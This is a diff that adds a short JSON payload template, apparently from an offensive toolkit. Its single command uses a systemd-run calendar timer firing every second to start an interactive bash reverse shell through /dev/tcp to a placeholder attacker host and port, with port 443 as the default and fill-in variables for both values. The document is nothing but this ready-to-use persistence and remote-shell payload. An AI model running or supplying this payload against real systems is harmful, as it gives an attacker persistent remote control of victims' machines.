@@ -1,0 +1,10 @@
+{
+	"line": "systemd-run --on-calendar='*:*:0/1' --timer-property=AccuracySec=100ms /bin/bash -c '/bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1'",
+	"variables": {
+        "LPORT": "LPORT",
+        "LHOST": "LHOST"
+	},
+    "defaults": {
+        "LPORT": "443"
+    }
+}
